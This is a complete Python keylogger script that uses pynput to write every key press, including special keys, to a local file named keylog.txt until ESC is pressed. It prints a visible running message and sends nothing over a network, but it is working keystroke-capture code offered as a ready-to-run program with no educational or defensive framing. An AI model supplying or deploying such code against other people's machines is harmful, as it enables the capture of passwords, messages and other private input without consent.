from pynput import keyboard

# The file where we'll log the keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function invoked when a key is pressed.
    Logs the key press to a file.
    """
    try:
        # Try to get the character representation of the key
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # If the key is a special key (e.g., shift, ctrl), we log its name
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key}")

def on_release(key):
    """
    Callback function invoked when a key is released.
    Stops the keylogger if the 'esc' key is released.
    """
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    print("Simple Keylogger running... (Press ESC to stop)")
    
    # Set up the listener for key presses
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()

